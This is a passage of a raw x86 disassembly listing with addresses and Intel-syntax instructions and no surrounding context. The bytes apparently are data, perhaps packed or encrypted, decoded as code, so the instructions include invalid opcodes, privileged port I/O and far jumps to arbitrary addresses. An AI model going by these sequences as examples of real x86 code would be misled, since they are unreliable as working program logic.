  41705f:	mov    ds:0x4f93ba33,eax
  417064:	sar    DWORD PTR [eax+esi*2],cl
  417067:	push   0xffffffdb
  417069:	daa    
  41706a:	test   DWORD PTR [edi],eax
  41706c:	push   eax
  41706d:	(bad)  
  41706e:	into   
  41706f:	push   edx
  417070:	cli    
  417071:	add    BYTE PTR [esi],bh
  417073:	gs mov ch,0xa7
  417076:	sbb    DWORD PTR ds:0x38c4904b,esp
  41707c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41707d:	pop    esi
  41707e:	mov    ds:0xa9af38ef,eax
  417083:	data16 in al,dx
  417085:	shl    DWORD PTR [edi],0x37
  417088:	call   0xd972:0xe9003df9
  41708f:	hlt    
  417090:	mov    ebx,0xd88e0938
  417095:	retf   0x62af
  417098:	or     cl,BYTE PTR ds:[eax-0x55]
  41709c:	div    ebp
  41709e:	cs and ah,bl
  4170a1:	dec    eax
  4170a2:	enter  0x1dab,0xf8
  4170a6:	push   esp
  4170a7:	or     al,0x99
  4170a9:	mov    al,ds:0xe6d4874e
  4170ae:	gs push ecx
  4170b0:	sub    al,dh
  4170b2:	lock int3 
  4170b4:	push   cs
  4170b5:	push   ebp
  4170b6:	fdivp  st(3),st
  4170b8:	or     al,cl
  4170ba:	hlt    
  4170bb:	mov    al,ds:0xd1b1efc9
  4170c0:	mov    ecx,0x19f382bd
  4170c5:	repnz pop edi
  4170c7:	popf   
  4170c8:	stos   DWORD PTR es:[edi],eax
  4170c9:	and    al,0xc3
  4170cb:	in     eax,0xad
  4170cd:	sbb    esi,DWORD PTR [ebx-0x39004d41]
  4170d3:	push   edx
  4170d4:	mov    edx,0x485cbfdc
  4170d9:	xchg   ecx,eax
  4170da:	out    dx,eax
  4170db:	jg     0x417082
  4170dd:	inc    ebx
  4170de:	out    dx,al
  4170df:	mov    edi,0xd9e2a850
  4170e4:	fst    st(3)
  4170e6:	outs   dx,BYTE PTR ds:[esi]
  4170e7:	std    
  4170e8:	pusha  
  4170e9:	pop    esi
  4170ea:	push   0x56
  4170ec:	icebp  
  4170ed:	push   ss
  4170ee:	push   esi
  4170ef:	jp     0x417132
  4170f1:	push   eax
  4170f2:	fidiv  DWORD PTR [esi+0x73d128ef]
  4170f8:	es cwde 
  4170fa:	mov    bh,bl
  4170fc:	sbb    BYTE PTR [esi],ch
  4170fe:	popf   
  4170ff:	lods   eax,DWORD PTR ds:[esi]
  417100:	and    al,0x77
  417102:	sbb    ecx,esi
  417104:	sar    BYTE PTR [ebx],cl
  417106:	imul   ebp,DWORD PTR [ebx-0x3f],0x4d
  41710a:	in     eax,0x28
  41710c:	test   al,0x3d
  41710e:	pop    esp
  41710f:	add    al,0x6a
  417111:	test   al,0x4e
  417113:	rcr    BYTE PTR [ebx-0x514b3fa2],1
  417119:	xor    BYTE PTR ss:[ebx+0x34b506a8],al
  417120:	pop    ebp
  417121:	adc    eax,0xb4eae0de
  417126:	adc    BYTE PTR [esp+ecx*2+0x6d22cc2a],dl
  41712d:	push   ebx
  41712e:	dec    esi
  41712f:	or     cl,BYTE PTR [ecx-0x1de8dea5]
  417135:	dec    edx
  417136:	mov    ds:0x608a67cb,al
  41713b:	sub    al,0xc4
  41713d:	int    0x14
  41713f:	pop    ebp
  417140:	mov    dl,0x9d
  417142:	ja     0x417119
  417144:	js     0x417106
  417146:	retf   
  417147:	sbb    eax,0x900c3203
  41714c:	popa   
  41714d:	(bad)  
  41714e:	fistp  DWORD PTR [ebx+esi*1]
  417151:	dec    ebp
  417152:	cmp    ebx,ecx
  417154:	pop    ss
  417155:	ins    BYTE PTR es:[edi],dx
  417156:	pop    esp
  417157:	dec    eax
  417158:	jge    0x417103
  41715a:	pop    ss
  41715b:	fs test eax,0xfd7fc987
  417161:	adc    bh,bh
  417163:	hlt    
  417164:	jnp    0x41712d
  417166:	cwde   
  417167:	(bad)  
  417169:	fisub  WORD PTR [eax-0x56c368db]
  41716f:	ret    0x7440
  417172:	dec    ecx
  417173:	clc    
  417174:	jmp    0x3903a357
  417179:	pop    edi
  41717a:	lods   al,BYTE PTR ds:[esi]
  41717b:	rcr    BYTE PTR [ecx+0x5e],0x65
  41717f:	call   FWORD PTR [edx+0x7c]
  417182:	xchg   ecx,eax
  417183:	imul   eax,DWORD PTR [ebp-0x3e],0x9582bd16
  41718a:	adc    al,BYTE PTR [eax]
  41718c:	push   edi
  41718d:	(bad)  
  41718e:	pop    esi
  41718f:	pop    edi
  417190:	loopne 0x41716c
  417192:	cmp    al,0x8a
  417194:	adc    al,ah
  417196:	nop
  417197:	mov    ss,WORD PTR [esi-0x52]
  41719a:	sbb    edx,DWORD PTR [edx]
  41719c:	repnz push edx
  41719e:	and    eax,0x598239c6
  4171a3:	push   ss
  4171a4:	push   0x4fecc13e
  4171a9:	imul   esp,esi,0x7f
  4171ac:	xor    esi,DWORD PTR [ebx-0x68]
  4171af:	inc    eax
  4171b0:	add    eax,edi
  4171b2:	xchg   DWORD PTR [ebp-0x13da29e1],eax
  4171b8:	cmp    al,ch
  4171ba:	pusha  
  4171bb:	add    esp,DWORD PTR [edx]
  4171bd:	jmp    0x41723d
  4171bf:	fwait
  4171c0:	shl    DWORD PTR ds:0x9fa97a71,0x4b
  4171c7:	(bad)  
  4171c8:	or     al,0x98
  4171ca:	or     edx,DWORD PTR [edi+eiz*4+0x26ac9b44]
  4171d1:	cmp    bl,BYTE PTR ds:0xcb5ed8f9
  4171d7:	popf   
  4171d8:	push   ecx
  4171d9:	push   edi
  4171da:	mov    esi,0xc9133d96
  4171df:	dec    ebx
  4171e0:	or     eax,DWORD PTR [esi+0x59]
  4171e3:	out    dx,al
  4171e4:	out    0x52,al
  4171e6:	fldcw  WORD PTR [ecx-0x34]
  4171e9:	sub    BYTE PTR [edi],bl
  4171eb:	xchg   esi,eax
  4171ec:	and    ebx,ebx
  4171ee:	push   edx
  4171ef:	jb     0x4171e3
  4171f1:	xor    dl,BYTE PTR [edi]
  4171f3:	mov    eax,0x1e48fac5
  4171f8:	inc    ebx
  4171f9:	lahf   
  4171fa:	jge    0x4171e2
  4171fc:	sar    esp,0x22
  4171ff:	js     0x4171e0
  417201:	call   0xd6:0x9818375f
  417208:	mov    al,BYTE PTR [edi-0x16]
  41720b:	retf   0x3652
  41720e:	pop    ds
  41720f:	jb     0x4171a6
  417211:	inc    ebx
  417212:	jo     0x417205
  417214:	stc    
  417215:	shl    BYTE PTR [esi-0x38db7280],1
  41721b:	pop    ebp
  41721c:	mov    ds:0x1403f837,eax
  417221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417222:	cmp    eax,0x18583cb7
  417227:	jnp    0x4171d8
  417229:	cmp    bl,BYTE PTR [esi]
  41722b:	pop    edx
  41722c:	jle    0x417213
  41722e:	mov    al,ds:0xfdc9ed48
  417233:	call   edi
  417235:	idiv   DWORD PTR [edx]
  417237:	ja     0x4171f4
  417239:	and    DWORD PTR [ecx-0x4236a36e],0x49
  417240:	in     eax,dx
  417241:	loopne 0x417275
  417243:	and    BYTE PTR [ebx-0x47],0xab
  417247:	popa   
  417248:	(bad)  
  417249:	into   
  41724a:	sbb    cl,ch
  41724c:	and    al,0xff
  41724e:	sti    
  41724f:	jne    0x4171d3
  417251:	adc    BYTE PTR [esi+0x78be7b0c],dl
  417257:	int    0xa3
  417259:	inc    ebp
  41725a:	dec    eax
  41725b:	xor    eax,0xfd16633f
  417260:	inc    edx
  417261:	and    al,0x57
  417263:	and    ch,BYTE PTR [edx-0x2d12d7e2]
  417269:	test   eax,0x4d204579
  41726e:	xlat   BYTE PTR ds:[ebx]
  41726f:	shr    DWORD PTR [ecx-0x775dfb48],1
  417275:	outs   dx,BYTE PTR ds:[esi]
  417276:	frstor [eax]
  417278:	ds iret 
  41727a:	jb     0x4172a8
  41727c:	pop    ebx
  41727d:	sub    esp,eax
  41727f:	addr16 pop ss
  417281:	sahf   
  417282:	out    dx,al
  417283:	stos   BYTE PTR es:[edi],al
  417284:	adc    BYTE PTR [ebx-0x57],dl
  417287:	sbb    eax,DWORD PTR [edi+edx*2]
  41728a:	fsubr  QWORD PTR [edx+ebx*4-0x200c7311]
  417291:	sti    
  417292:	push   edx
  417293:	test   BYTE PTR [esi-0x4faba64b],dl
  417299:	retf   
  41729a:	push   DWORD PTR [edx-0x121cca16]
  4172a0:	xchg   eax,edi
  4172a2:	loopne 0x4172ac
  4172a4:	int3   
  4172a5:	pop    ds
  4172a6:	or     BYTE PTR [edx+0x2d],0xd5
  4172aa:	rcl    BYTE PTR [edi],1
  4172ac:	and    edx,ecx
  4172ae:	pop    edx
  4172af:	xchg   ebx,eax
  4172b0:	xchg   esi,eax
  4172b1:	jle    0x417324
  4172b3:	(bad)  
  4172b5:	fisub  DWORD PTR [esi]
  4172b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172b8:	jns    0x4172a0
  4172ba:	ror    DWORD PTR [eax],0xe4
  4172bd:	stos   BYTE PTR es:[edi],al
  4172be:	push   ebp
  4172bf:	ds call 0x32322a6a
  4172c5:	lock out 0xcb,eax
  4172c8:	dec    eax
  4172c9:	fsub   st(7),st
  4172cb:	into   
  4172cc:	ds out dx,al
  4172ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172cf:	xlat   BYTE PTR ds:[ebx]
  4172d0:	ficomp WORD PTR [edx-0x52]
  4172d3:	out    0xff,al
  4172d5:	sbb    DWORD PTR [esi+0x1fd0173c],ebx
  4172db:	pop    ebp
  4172dc:	into   
  4172dd:	dec    BYTE PTR [eax+0x9870e70]
  4172e3:	adc    dh,BYTE PTR [edi+eax*8]
  4172e6:	push   eax
  4172e7:	daa    
  4172e8:	sbb    cl,bh
  4172ea:	sbb    DWORD PTR [edi+0x7d262d01],edi
  4172f0:	or     al,0x68
  4172f2:	int    0x4d
  4172f4:	in     eax,dx
  4172f5:	mov    cl,BYTE PTR [ebx+ecx*4+0x5f005bb0]
  4172fc:	adc    ch,BYTE PTR [ebx-0x2a0f0890]
  417302:	lock xchg ecx,eax
  417304:	scas   eax,DWORD PTR es:[edi]
  417305:	bt     esp,eax
  417308:	imul   esi,DWORD PTR [ebx],0xb9009d3e
  41730e:	push   esi
  41730f:	(bad)  
  417310:	mov    bh,0xe0
  417312:	aaa    
  417313:	jg     0x417363
  417315:	and    al,0xe0
  417317:	mov    edi,0x5a6d0297
  41731c:	sbb    al,BYTE PTR [eax+0x4]
  41731f:	mov    edx,0x17accc45
  417324:	sub    dl,0x64
  417327:	mov    esi,0x10bb1f4
  41732c:	sub    al,0x17
  41732e:	sahf   
  41732f:	pop    ebp
  417330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417331:	jnp    0x4172ef
  417333:	sti    
  417334:	ja     0x41737f
  417336:	repnz fnstenv [ecx]
  417339:	jmp    DWORD PTR [ebp+0x23]
  41733c:	jo     0x417365
  41733e:	sbb    esp,esi
  417340:	jl     0x417353
  417342:	or     DWORD PTR ds:0x7860a2ac,ebp
  417348:	inc    esi
  417349:	pop    edx
  41734a:	sub    ebp,ebp
  41734c:	sbb    bl,BYTE PTR [edx]
  41734e:	fldenv [esi-0x2be75353]
  417354:	stos   BYTE PTR es:[edi],al
  417355:	sbb    BYTE PTR [eax],0xf
  417358:	mov    cl,0x91
  41735a:	mov    al,0xb7
  41735c:	and    BYTE PTR [ebp+0x28],cl
  41735f:	dec    edx
  417360:	adc    dl,BYTE PTR ds:0x20e67f81
  417366:	fsub   DWORD PTR [esi-0x13ece258]
  41736c:	mov    ecx,0xb8a4da49
  417371:	ret    0xa3e0
  417374:	(bad)
  417377:	ds (bad) 
  41737a:	jmp    0x4173ae
  41737c:	loope  0x41739f
  41737e:	les    edi,FWORD PTR [edi+0xf]
  417381:	xor    DWORD PTR [ebx],edx
  417383:	es pop ebx
  417385:	out    dx,al
  417386:	xchg   DWORD PTR [eax+esi*2+0x18],ebx
  41738a:	dec    ebx
  41738b:	loopne 0x417373
  41738d:	cwde   
  41738e:	inc    ecx
  41738f:	popf   
  417390:	mov    ebp,0xdb9328c3
  417395:	cdq    
  417396:	and    DWORD PTR [ecx+0x45cb4519],0x393c4db3
  4173a0:	jns    0x4173f3
  4173a2:	and    eax,0x92239d02
  4173a7:	pop    eax
  4173a8:	call   0x1213:0xb16a9207
  4173af:	in     al,0x4d
  4173b1:	iret   
  4173b2:	stc    
  4173b3:	ret    
  4173b4:	dec    ebx
  4173b5:	mov    eax,0x9e263e6f
  4173ba:	jno    0x417397
  4173bc:	and    DWORD PTR [esi+0x505d8e8],edi
  4173c2:	mov    ds:0x34c3868c,eax
  4173c7:	adc    BYTE PTR [edi-0x59],0x14
  4173cb:	jb     0x41741d
  4173cd:	or     dh,0xe7
  4173d0:	push   eax
  4173d1:	sub    DWORD PTR [ebx+0x1a4614a6],edi
  4173d7:	lods   al,BYTE PTR ds:[esi]
  4173d8:	cmp    edi,DWORD PTR [eax]
  4173da:	loop   0x4173bf
  4173dc:	jns    0x40250286
  4173e2:	mov    edi,0xa1e5ebd6
  4173e7:	adc    dl,BYTE PTR [esi-0x1e0048b0]
  4173ed:	test   al,0xfc
  4173ef:	mov    al,ds:0xfec7c038
  4173f4:	mov    BYTE PTR [eax+eax*4+0x6b],cl
  4173f8:	neg    BYTE PTR [edx+0x274a113f]
  4173fe:	inc    edx
  4173ff:	lds    edi,FWORD PTR [eax+0x19b06a]
  417405:	sbb    esp,esi
  417407:	mov    ch,0x95
  417409:	dec    edx
  41740a:	inc    esi
  41740b:	or     eax,0x23ea5a78
  417410:	xor    al,0x9a
  417412:	xor    BYTE PTR [eax+0x7e],dl
  417415:	push   ebp
  417416:	xor    DWORD PTR [ebx],edi
  417418:	mov    es,WORD PTR [ebp+0x43520245]
  41741e:	shl    eax,0x90
  417421:	jno    0x417430
  417423:	aad    0x87
  417425:	fs (bad) 
  417428:	jne    0x4173e4
  41742a:	jmp    0x600b:0xf7818921
  417431:	dec    edi
  417432:	fstp   QWORD PTR [ebp-0x23]
  417435:	xor    dl,dh
  417437:	xor    edx,DWORD PTR [ebx+0x77ceb7dc]
  41743d:	pop    ebx
  41743e:	jo     0x417409
  417440:	shl    ebx,1
  417442:	push   edx
  417443:	out    0x50,al
  417445:	push   0x236218f9
  41744a:	jl     0x41742b
  41744c:	call   0xc44a9e65
  417451:	mov    dl,BYTE PTR [eax+ecx*2]
  417454:	repz in eax,dx
  417456:	adc    bh,al
  417458:	fidivr WORD PTR [esi]
  41745a:	jo     0x4173e8
  41745c:	mov    ebx,0x7f700a3
  417461:	jbe    0x4174c2
  417463:	stos   DWORD PTR es:[edi],eax
  417464:	das    
  417465:	push   ecx
  417466:	sub    DWORD PTR [edi-0x4e34a7cc],edx
  41746c:	xchg   edx,edi
  41746e:	pop    eax
  41746f:	sbb    ecx,DWORD PTR [edx]
  417471:	pop    ebp
  417472:	adc    esi,ecx
  417474:	jo     0x41743b
  417476:	xor    edi,ebp
  417478:	mov    dl,0x6d
  41747a:	jo     0x417431
  41747c:	push   eax
  41747d:	push   0xffffffda
  41747f:	pop    ebp
  417480:	jmp    0xdaba5f58
  417485:	cmp    BYTE PTR [esi-0x2df5b894],bh
  41748b:	mov    ah,0x78
  41748d:	dec    edi
  41748e:	iret   
  41748f:	outs   dx,DWORD PTR ds:[esi]
  417490:	and    eax,0x73315e01
  417495:	lock mov eax,0x604fc71f
  41749b:	iret   
  41749c:	imul   edi,DWORD PTR [ebp+0x27],0xffffffe2
  4174a0:	mov    DWORD PTR [edx+edx*1+0x4],edi
  4174a4:	pusha  
  4174a5:	mov    es,WORD PTR [esi]
  4174a7:	sbb    DWORD PTR [esi-0x3511105d],edi
  4174ad:	(bad)  
  4174ae:	fdivrp st(0),st
  4174b0:	loope  0x417525
  4174b2:	push   edx
  4174b3:	sbb    DWORD PTR [ecx-0x35],edx
  4174b6:	sahf   
  4174b7:	adc    eax,0x42d93915
  4174bc:	aas    
  4174bd:	sub    DWORD PTR [ebx+0x6],edi
  4174c0:	mov    al,0x29
  4174c2:	imul   ebx,DWORD PTR [ecx-0x65370a87],0xffffffc0
  4174c9:	sub    DWORD PTR [ebp-0x38],edx
  4174cc:	data16 clc 
  4174ce:	xchg   ecx,eax
  4174cf:	outs   dx,BYTE PTR ds:[esi]
  4174d0:	fmul   QWORD PTR [eax]
  4174d2:	jmp    0xfa2d:0x6ab9afa5
  4174d9:	jg     0x4174fc
  4174db:	add    al,0xcb
  4174dd:	jle    0x417483
  4174df:	imul   ebx,ebx,0x75503bcc
  4174e5:	dec    ebp
  4174e6:	add    al,0x2
  4174e8:	jnp    0x4174ff
  4174ea:	and    ecx,DWORD PTR [edi-0x616b78bc]
  4174f0:	sub    eax,0xe0b018b
  4174f5:	sub    edx,DWORD PTR [eax]
  4174f7:	addr16 out dx,al
  4174f9:	jns    0x4174ec
  4174fb:	(bad)  
  4174fc:	ficomp WORD PTR [ebx]
  4174fe:	jbe    0x417529
  417500:	or     DWORD PTR [esi+0x52],ebp
  417503:	dec    ecx
  417504:	rcl    BYTE PTR [edx],1
  417506:	outs   dx,DWORD PTR ds:[esi]
  417507:	lods   eax,DWORD PTR ds:[esi]
  417508:	jo     0x4174b2
  41750a:	add    edx,DWORD PTR [ecx+0x0]
  41750d:	or     DWORD PTR [esi+0x19],edi
  417510:	(bad)  
  417511:	jg     0x4174f5
  417513:	int3   
  417514:	js     0x417527
  417516:	(bad)  
  417517:	jne    0x417554
  417519:	xchg   ebp,eax
  41751a:	lods   al,BYTE PTR ds:[esi]
  41751b:	push   0xd351898d
  417520:	add    BYTE PTR [eax-0x2c],0xb4
  417524:	dec    ebp
  417525:	xchg   esi,eax
  417526:	iret   
  417527:	cmp    eax,0x2ea42733
  41752c:	cwd    
  41752e:	push   edi
  41752f:	xor    cl,BYTE PTR [ebp-0xe]
  417532:	(bad)
  417536:	pop    ebx
  417537:	inc    eax
  417538:	popa   
  417539:	sbb    al,0xfc
  41753b:	jg     0x4175b5
  41753d:	add    bl,BYTE PTR [ecx-0x6ecc554]
  417543:	sahf   
  417544:	leave  
  417545:	scas   al,BYTE PTR es:[edi]
  417546:	bound  ebp,QWORD PTR [ebx]
  417548:	call   0x7643:0x94586e48
  41754f:	mov    dl,0x19
  417551:	xor    ch,0x69
  417554:	ins    DWORD PTR es:[edi],dx
  417555:	xchg   ebp,eax
  417556:	adc    dl,bl
  417558:	outs   dx,BYTE PTR ds:[esi]
  417559:	lods   eax,DWORD PTR ds:[esi]
  41755a:	bound  esi,QWORD PTR [esi-0x52578ce7]
  417560:	mov    ebx,0x454aa2b4
  417565:	gs push ebp
  417567:	jmp    0x417598
  417569:	add    BYTE PTR [eax+edx*8-0x28],dl
  41756d:	pop    ecx
  41756e:	cmc    
  41756f:	xor    BYTE PTR [eax],dl
  417571:	(bad)  
  417572:	ins    DWORD PTR es:[edi],dx
  417573:	inc    eax
  417574:	rcl    DWORD PTR [esi-0x69],cl
  417577:	ret    0x6271
  41757a:	dec    esi
  41757b:	mov    BYTE PTR [ebp+0x69],dl
  41757e:	(bad)  
  417580:	frndint 
  417582:	or     DWORD PTR [esi-0x6e28308],0x1049d538
  41758c:	cmp    ebx,DWORD PTR [ecx]
  41758e:	sbb    al,0x87
  417590:	in     al,dx
  417591:	cdq    
  417592:	jbe    0x41755a
  417594:	xchg   esi,eax
  417595:	cmp    al,0x98
  417597:	aas    
  417598:	inc    edi
  417599:	sbb    eax,0x5f7f1f88
  41759e:	adc    eax,0x2421cb6d
  4175a3:	pop    ds
  4175a4:	inc    ebx
  4175a5:	and    eax,DWORD PTR ds:0xb3e6d8c
  4175ab:	loopne 0x417545
  4175ad:	inc    ecx
  4175ae:	daa    
  4175af:	test   BYTE PTR [esi-0xc27e315],ah
  4175b5:	add    esi,DWORD PTR [eax+0x35cc66a1]
  4175bb:	sub    al,BYTE PTR [edi-0x42]
  4175be:	adc    al,0xa4
  4175c0:	(bad)  
  4175c1:	scas   eax,DWORD PTR es:[edi]
  4175c2:	aas    
  4175c3:	repnz add al,BYTE PTR [eax+0x5]
  4175c7:	dec    ebp
  4175c8:	push   es
  4175c9:	jl     0x9fed2c42
  4175cf:	and    eax,0x73f191e6
  4175d4:	test   al,0x81
  4175d6:	mov    al,ds:0x62c2b8f8
  4175db:	and    BYTE PTR [ebp+edx*4-0x63],0x55
  4175e0:	push   0x66
  4175e2:	jle    0x417600
  4175e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e5:	dec    eax
  4175e6:	fs sbb eax,0xab20ced2
  4175ec:	add    ebx,DWORD PTR [eax-0x5b]
  4175ef:	xor    BYTE PTR [esi-0x7f],bl
  4175f2:	jmp    DWORD PTR [edx+ebp*2+0x5d]
  4175f6:	push   ds
  4175f7:	add    al,0xbe
  4175f9:	jmp    0xb978:0x466c4a4e
  417600:	xchg   esp,eax
  417601:	(bad)  
  417603:	inc    eax
  417604:	pop    ebx
  417605:	stos   BYTE PTR es:[edi],al
  417606:	mov    WORD PTR [edx],fs
  417608:	mov    esi,0xb503e787
  41760d:	outs   dx,BYTE PTR ds:[esi]
  41760e:	push   ss
  41760f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417610:	xor    eax,esp
  417612:	xchg   bh,ah
  417614:	das    
  417615:	sbb    eax,0xe77bcdb7
  41761a:	test   DWORD PTR [edi-0x39],esp
  41761d:	stos   BYTE PTR es:[edi],al
  41761e:	inc    esp
  41761f:	jnp    0x417660
  417621:	push   cs
  417622:	inc    ebp
  417623:	jb     0x41769b
  417625:	out    0xa6,al
  417627:	mov    edx,0x107f5764
  41762c:	xor    al,0xfc
  41762e:	inc    esp
  41762f:	nop
  417630:	push   ebx
  417631:	dec    esi
  417632:	clc    
  417633:	test   eax,0xa7fc51d5
  417638:	outs   dx,DWORD PTR ds:[esi]
  417639:	fdiv   DWORD PTR [edx-0x1bcc3d6d]
  41763f:	sbb    al,0x77
  417641:	pop    es
  417642:	add    BYTE PTR [edi-0x2e],dl
  417645:	adc    edx,esp
  417647:	retf   0xb758
  41764a:	xchg   ebp,esi
  41764c:	cld    
  41764d:	jns    0x41764e
  41764f:	repnz xor BYTE PTR [esi-0x61ca8002],bl
  417656:	shl    DWORD PTR [ecx-0x61bb5827],cl
  41765c:	mov    dh,0xa2
  41765e:	mov    ds:0xbdb99f69,al
  417663:	mov    BYTE PTR [eax+esi*1-0x44],cl
  417667:	lahf   
  417668:	test   DWORD PTR [ebp+eax*1+0x2a7490c],0xdcd2ad3b
  417673:	es (bad) 
  417675:	or     BYTE PTR ds:[eax-0x4dba3c63],ah
  41767c:	call   0x98f0:0x2d1aa0e0
  417683:	loop   0x417608
  417685:	shr    DWORD PTR [ecx+0x57],1
  417688:	cmp    bh,BYTE PTR [edi+0x62]
  41768b:	cmp    al,0x11
  41768d:	aas    
  41768e:	sti    
  41768f:	add    eax,0xc3448218
  417694:	js     0x417662
  417696:	imul   ecx,DWORD PTR [ebp-0x3f0f2d2f],0x6
  41769d:	(bad)  
  41769e:	outs   dx,BYTE PTR ds:[esi]
  41769f:	sbb    al,0xf7
  4176a1:	push   edx
  4176a2:	(bad)  
  4176a3:	fdecstp 
  4176a5:	pop    ecx
  4176a6:	outs   dx,DWORD PTR ds:[esi]
  4176a7:	or     ebx,DWORD PTR ds:0xe2de4e9c
  4176ad:	add    bl,BYTE PTR ds:0xe1ef1c61
  4176b3:	cmc    
  4176b4:	xlat   BYTE PTR ds:[ebx]
  4176b5:	fsub   st,st(7)
  4176b7:	pop    ebp
  4176b8:	xor    al,0xf0
  4176ba:	ins    DWORD PTR es:[edi],dx
  4176bb:	or     eax,0xf30828da
  4176c0:	int3   
  4176c1:	push   0xffffff91
  4176c3:	mov    ?,esp
  4176c5:	fild   QWORD PTR [edi+0x6f96845f]
  4176cb:	(bad)  
  4176cc:	and    eax,0x157106e3
  4176d1:	pop    esi
  4176d2:	pop    es
  4176d3:	repnz (bad) 
  4176d5:	pop    ecx
  4176d6:	jge    0x41774a
  4176d8:	call   0xdf72:0x4cb55584
  4176df:	push   edx
  4176e0:	cmp    eax,0x1912a767
  4176e5:	sbb    eax,0x24b0fea8
  4176ea:	mov    edi,0x1f14ba9c
  4176ef:	xor    al,0x84
  4176f1:	ret    
  4176f2:	or     al,0xce
  4176f4:	mov    edx,0x48f6c24f
  4176f9:	or     al,BYTE PTR [ebp+0x4a]
  4176fc:	xor    al,0xee
  4176fe:	rcl    DWORD PTR [edx],1
  417700:	and    DWORD PTR [edi+0x64],0xffcb43d
  417707:	pop    esp
  417708:	das    
  417709:	mov    esi,0xa517b484
  41770e:	inc    ecx
  41770f:	out    0xb9,al
  417711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417712:	in     al,0xeb
  417714:	jb     0x417776
  417716:	out    0xef,eax
  417718:	daa    
  417719:	mov    esi,0xf2710984
  41771e:	stc    
  41771f:	adc    ecx,DWORD PTR ds:0x4d807745
  417725:	daa    
  417726:	jbe    0x417737
  417728:	inc    edx
  417729:	out    dx,al
  41772a:	adc    DWORD PTR [ecx],edx
  41772c:	add    ch,ah
  41772e:	in     eax,0x53
  417730:	xchg   DWORD PTR [ebp-0x4fb4abbe],edi
  417736:	cmp    eax,0x2c33074b
  41773b:	cmc    
  41773c:	inc    eax
  41773d:	fistp  WORD PTR [edi]
  41773f:	js     0x4176f6
  417741:	aad    0x3a
  417743:	hlt    
  417744:	mov    dh,0x1
  417746:	add    edi,DWORD PTR [di-0x58d7]
  41774b:	loop   0x41770a
  41774d:	xlat   BYTE PTR ss:[ebx]
  41774f:	sahf   
  417750:	jbe    0x417728
  417752:	add    DWORD PTR [ebx],ecx
  417754:	pop    edx
  417755:	add    eax,0xc6bacade
  41775a:	jmp    0x94b00ec
  41775f:	leave  
  417760:	sti    
  417761:	sbb    DWORD PTR [esp+eax*4-0x23],esp
  417765:	and    bl,BYTE PTR [ecx]
  417767:	xchg   ebp,eax
  417768:	pop    ss
  417769:	xor    al,BYTE PTR ds:0x50bd
  41776e:	sub    BYTE PTR [eax+edi*2-0x26],ch
  417772:	inc    esp
  417773:	and    al,0xcf
  417775:	sahf   
  417776:	mov    esi,0x64ee45c2
  41777b:	jb     0x41776f
  41777d:	cmp    al,0x15
  41777f:	out    0xd1,al
  417781:	push   ebp
  417782:	or     eax,esp
  417784:	dec    eax
  417785:	mov    edi,DWORD PTR [esi]
  417787:	pop    edx
  417788:	mov    esi,0xaa467bbd
  41778d:	sbb    DWORD PTR [eax+0x7d],0xfb55d28b
  417794:	jno    0x417734
  417796:	adc    edi,ebx
  417798:	not    ebp
  41779a:	(bad)  
  41779b:	sahf   
  41779c:	(bad)  
  41779d:	jle    0x4177e2
  41779f:	jne    0x41779b
  4177a1:	cmp    cl,BYTE PTR [ecx-0x2f]
  4177a4:	cmp    BYTE PTR [ebx+0x41],0x81
  4177a8:	xchg   edx,eax
  4177a9:	inc    ebx
  4177aa:	add    BYTE PTR [ebp+0x6f],0xae
  4177ae:	xchg   esi,eax
  4177af:	mov    bl,0x4e
  4177b1:	or     dl,BYTE PTR [eax-0x4e]
  4177b4:	test   DWORD PTR [edi+0x742c7fcd],ecx
  4177ba:	rcl    BYTE PTR [eax-0x3e16c54],cl
  4177c0:	stc    
  4177c1:	dec    edx
  4177c2:	xchg   esi,eax
  4177c3:	loopne 0x41781b
  4177c5:	ret    0x92c1
  4177c8:	loope  0x4177e8
  4177ca:	mov    cl,0x95
  4177cc:	mov    bl,0x42
  4177ce:	bound  eax,QWORD PTR [esi-0x2862092]
  4177d4:	mov    ah,0x5b
  4177d6:	jecxz  0x4177d8
  4177d8:	and    al,0xb6
  4177da:	sbb    al,0xf7
  4177dc:	icebp  
  4177dd:	imul   edx,DWORD PTR [edx+0x50762e3a],0x18
  4177e4:	icebp  
  4177e5:	loopne 0x4177ab
  4177e7:	retf   
  4177e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177e9:	or     eax,0xa7b8c0e3
  4177ee:	xor    cl,cl
  4177f0:	inc    ebx
  4177f1:	xor    BYTE PTR [esi-0x27],0x2d
  4177f5:	push   ecx
  4177f6:	add    eax,DWORD PTR [ebx-0x4e]
  4177f9:	sub    esi,eax
  4177fb:	ins    BYTE PTR es:[edi],dx
  4177fc:	cwde   
  4177fd:	addr16 mov bl,0x32
  417800:	iret   
  417801:	adc    eax,0x11fc8ba0
  417806:	call   0x68e6:0xeb7a804e
  41780d:	das    
  41780e:	pop    ss
  41780f:	cmp    bh,BYTE PTR [eax-0x2]
  417812:	xor    DWORD PTR [edi-0x7e564f7a],ebp
  417818:	sub    DWORD PTR [edx+0x14],edi
  41781b:	out    dx,eax
  41781c:	adc    dl,bl
  41781e:	push   ss
  41781f:	adc    DWORD PTR [esi+0x49e305c1],ecx
  417825:	and    BYTE PTR [ecx+0x4],ah
  417828:	imul   BYTE PTR [ecx+edx*8]
  41782b:	fs ins DWORD PTR es:[edi],dx
  41782d:	dec    edx
  41782e:	pop    esi
  41782f:	or     bl,0xd7
  417832:	(bad)  
  417833:	call   0x22754eaf
  417838:	mov    ah,0x27
  41783a:	add    dl,ch
  41783c:	cmp    ebx,edx
  41783e:	jns    0x4178b2
  417840:	in     eax,dx
  417841:	fimul  DWORD PTR [edx+0x765764e1]
  417847:	test   eax,0x2d4eb8fe
  41784c:	cmp    BYTE PTR [ebx+edi*2-0x7b],dh
  417850:	xchg   ebp,eax
  417851:	add    ecx,DWORD PTR [eax]
  417853:	xchg   edi,eax
  417854:	ds fdivr st(3),st
  417857:	fld    st(6)
  417859:	adc    al,0xa8
  41785b:	inc    ecx
  41785c:	pop    ebx
  41785d:	clc    
  41785e:	and    esi,ebx
  417860:	ja     0x417874
  417862:	jbe    0x4178e2
